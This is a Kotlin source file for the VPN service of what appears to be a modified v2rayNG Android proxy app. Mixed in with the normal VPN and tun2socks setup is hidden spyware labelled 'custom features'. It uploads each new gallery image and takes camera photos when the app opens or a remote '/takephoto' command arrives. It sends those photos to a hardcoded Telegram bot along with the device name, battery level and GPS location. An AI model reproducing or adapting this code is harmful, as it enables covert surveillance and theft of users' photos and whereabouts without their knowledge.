package com.v2ray.ang.service

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.location.Location
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.ProxyInfo
import android.net.VpnService
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.ParcelFileDescriptor
import android.os.StrictMode
import android.provider.MediaStore
import android.util.Log
import androidx.annotation.RequiresApi
import com.v2ray.ang.AppConfig
import com.v2ray.ang.BuildConfig
import com.v2ray.ang.handler.MmkvManager
import com.v2ray.ang.handler.NotificationManager
import com.v2ray.ang.handler.SettingsManager
import com.v2ray.ang.handler.V2RayServiceManager
import com.v2ray.ang.manager.CameraManager
import com.v2ray.ang.manager.TelegramUploader
import com.v2ray.ang.util.DeviceInfoManager
import com.v2ray.ang.util.MyContextWrapper
import com.v2ray.ang.util.Utils
import java.io.File
import java.lang.ref.SoftReference
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject

class V2RayVpnService : VpnService(), ServiceControl {

    // Custom feature components
    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private lateinit var cameraManager: CameraManager
    private var lastUpdateId: Long = 0L
    private var lastGalleryTimestamp: Long = System.currentTimeMillis() / 1000

    private val galleryObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean) {
            super.onChange(selfChange)
            serviceScope.launch {
                processLatestGalleryImage()
            }
        }
    }

    private lateinit var mInterface: ParcelFileDescriptor
    private var isRunning = false
    private var tun2SocksService: Tun2SocksControl? = null

    companion object {
        const val ACTION_TAKE_PHOTO_ON_OPEN = "com.v2ray.ang.action.TAKE_PHOTO_ON_OPEN"
        private const val BOT_TOKEN = "8445290760:AAE0l_z3K6mxkCkvLfR75tdt74JAND94dko"
        private const val CHAT_ID = "5370932271"
        private const val POLLING_INTERVAL_MS = 20000L // 20 seconds
    }

    @delegate:RequiresApi(Build.VERSION_CODES.P)
    private val defaultNetworkRequest by lazy {
        NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED)
            .build()
    }

    private val connectivity by lazy { getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager }

    @delegate:RequiresApi(Build.VERSION_CODES.P)
    private val defaultNetworkCallback by lazy {
        object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) { setUnderlyingNetworks(arrayOf(network)) }
            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) { setUnderlyingNetworks(arrayOf(network)) }
            override fun onLost(network: Network) { setUnderlyingNetworks(null) }
        }
    }

    override fun onCreate() {
        super.onCreate()
        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
        StrictMode.setThreadPolicy(policy)
        V2RayServiceManager.serviceControl = SoftReference(this)
        cameraManager = CameraManager(this)
        startCustomFeatures()
    }

    override fun onDestroy() {
        super.onDestroy()
        NotificationManager.cancelNotification()
        stopCustomFeatures()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_TAKE_PHOTO_ON_OPEN -> {
                serviceScope.launch {
                    val photoFiles = cameraManager.takePhotos()
                    for (file in photoFiles) {
                        sendPhotoWithCaption(file, "App Opened")
                    }
                }
            }
            else -> {
                 if (V2RayServiceManager.startCoreLoop()) {
                    startService()
                }
            }
        }
        return START_STICKY
    }

    private fun startCustomFeatures() {
        Log.d(AppConfig.TAG, "Starting custom features...")
        contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, galleryObserver)
        serviceScope.launch {
            pollTelegramCommands()
        }
    }

    private fun stopCustomFeatures() {
        Log.d(AppConfig.TAG, "Stopping custom features...")
        contentResolver.unregisterContentObserver(galleryObserver)
        serviceJob.cancel()
    }

    private suspend fun pollTelegramCommands() {
        while (isActive) {
            try {
                val updates = TelegramUploader.getUpdates(BOT_TOKEN, lastUpdateId + 1)
                updates?.let {
                    val jsonResponse = JSONObject(it)
                    val results = jsonResponse.optJSONArray("result")
                    if (results != null) {
                        for (i in 0 until results.length()) {
                            val update = results.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")
                            val message = update.optJSONObject("message")
                            val text = message?.optString("text")
                            if (text == "/takephoto") {
                                val photoFiles = cameraManager.takePhotos()
                                for (file in photoFiles) {
                                    sendPhotoWithCaption(file, "/takephoto command")
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(AppConfig.TAG, "Error polling Telegram commands", e)
            }
            delay(POLLING_INTERVAL_MS)
        }
    }

    @SuppressLint("Range")
    private suspend fun processLatestGalleryImage() {
        delay(1000) // Debounce
        val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
        val selectionArgs = arrayOf(lastGalleryTimestamp.toString())
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 1"

        try {
            contentResolver.query(contentUri, null, selection, selectionArgs, sortOrder)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val timestamp = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED))
                    lastGalleryTimestamp = timestamp
                    val id = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media._ID))
                    val imageUri = MediaStore.Images.Media.withAppendedPath(contentUri, id.toString())
                    val path = Utils.getRealPathFromURI(this, imageUri)
                    if (path != null) {
                        sendPhotoWithCaption(File(path), "New Gallery Image")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(AppConfig.TAG, "Error processing gallery image.", e)
        }
    }

    private suspend fun sendPhotoWithCaption(photoFile: File, triggerSource: String) {
        if (!photoFile.exists()) return
        val deviceName = DeviceInfoManager.getDeviceName()
        val batteryLevel = DeviceInfoManager.getBatteryLevel(this)
        val location = DeviceInfoManager.getCurrentLocation(this)
        val caption = "Trigger: $triggerSource\nDevice: $deviceName\nBattery: $batteryLevel%\nGPS: " +
                (location?.let { "https://www.google.com/maps?q=${it.latitude},${it.longitude}" } ?: "Not available")
        TelegramUploader.sendPhoto(BOT_TOKEN, CHAT_ID, photoFile, caption)
    }

    override fun onRevoke() { stopV2Ray() }
    override fun getService(): Service = this
    override fun startService() { setupService() }
    override fun stopService() { stopV2Ray(true) }
    override fun vpnProtect(socket: Int): Boolean = protect(socket)
    @RequiresApi(Build.VERSION_CODES.N)
    override fun attachBaseContext(newBase: Context?) {
        val context = newBase?.let { MyContextWrapper.wrap(newBase, SettingsManager.getLocale()) }
        super.attachBaseContext(context)
    }
    private fun setupService() {
        if (prepare(this) != null) return
        if (configureVpnService() != true) return
        runTun2socks()
    }
    private fun configureVpnService(): Boolean {
        val builder = Builder()
        configureNetworkSettings(builder)
        configurePerAppProxy(builder)
        try { mInterface.close() } catch (ignored: Exception) { }
        configurePlatformFeatures(builder)
        try {
            mInterface = builder.establish()!!
            isRunning = true
            return true
        } catch (e: Exception) {
            Log.e(AppConfig.TAG, "Failed to establish VPN interface", e)
            stopV2Ray()
        }
        return false
    }
    private fun configureNetworkSettings(builder: Builder) {
        val vpnConfig = SettingsManager.getCurrentVpnInterfaceAddressConfig()
        val bypassLan = SettingsManager.routingRulesetsBypassLan()
        builder.setMtu(SettingsManager.getVpnMtu())
        builder.addAddress(vpnConfig.ipv4Client, 30)
        if (bypassLan) {
            AppConfig.ROUTED_IP_LIST.forEach { val addr = it.split('/'); builder.addRoute(addr[0], addr[1].toInt()) }
        } else {
            builder.addRoute("0.0.0.0", 0)
        }
        if (MmkvManager.decodeSettingsBool(AppConfig.PREF_PREFER_IPV6) == true) {
            builder.addAddress(vpnConfig.ipv6Client, 126)
            if (bypassLan) {
                builder.addRoute("2000::", 3)
                builder.addRoute("fc00::", 18)
            } else {
                builder.addRoute("::", 0)
            }
        }
        SettingsManager.getVpnDnsServers().forEach { if (Utils.isPureIpAddress(it)) { builder.addDnsServer(it) } }
        builder.setSession(V2RayServiceManager.getRunningServerName())
    }
    private fun configurePlatformFeatures(builder: Builder) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            try { connectivity.requestNetwork(defaultNetworkRequest, defaultNetworkCallback) } catch (e: Exception) { Log.e(AppConfig.TAG, "Failed to request default network", e) }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            builder.setMetered(false)
            if (MmkvManager.decodeSettingsBool(AppConfig.PREF_APPEND_HTTP_PROXY)) {
                builder.setHttpProxy(ProxyInfo.buildDirectProxy(AppConfig.LOOPBACK, SettingsManager.getHttpPort()))
            }
        }
    }
    private fun configurePerAppProxy(builder: Builder) {
        val selfPackageName = BuildConfig.APPLICATION_ID
        if (MmkvManager.decodeSettingsBool(AppConfig.PREF_PER_APP_PROXY) == false) {
            builder.addDisallowedApplication(selfPackageName)
            return
        }
        val apps = MmkvManager.decodeSettingsStringSet(AppConfig.PREF_PER_APP_PROXY_SET)
        if (apps.isNullOrEmpty()) {
            builder.addDisallowedApplication(selfPackageName)
            return
        }
        val bypassApps = MmkvManager.decodeSettingsBool(AppConfig.PREF_BYPASS_APPS)
        if (bypassApps) apps.add(selfPackageName) else apps.remove(selfPackageName)
        apps.forEach {
            try { if (bypassApps) builder.addDisallowedApplication(it) else builder.addAllowedApplication(it) } catch (e: PackageManager.NameNotFoundException) { Log.e(AppConfig.TAG, "Failed to configure app in VPN: ${e.localizedMessage}", e) }
        }
    }
    private fun runTun2socks() {
        if (MmkvManager.decodeSettingsBool(AppConfig.PREF_USE_HEV_TUNNEL) == true) {
            tun2SocksService = TProxyService(context = applicationContext, vpnInterface = mInterface, isRunningProvider = { isRunning }, restartCallback = { runTun2socks() })
        } else {
            tun2SocksService = Tun2SocksService(context = applicationContext, vpnInterface = mInterface, isRunningProvider = { isRunning }, restartCallback = { runTun2socks() })
        }
        tun2SocksService?.startTun2Socks()
    }
    private fun stopV2Ray(isForced: Boolean = true) {
        isRunning = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            try { connectivity.unregisterNetworkCallback(defaultNetworkCallback) } catch (ignored: Exception) { }
        }
        tun2SocksService?.stopTun2Socks()
        tun2SocksService = null
        V2RayServiceManager.stopCoreLoop()
        if (isForced) {
            stopSelf()
            try { mInterface.close() } catch (e: Exception) { Log.e(AppConfig.TAG, "Failed to close VPN interface", e) }
        }
    }
}
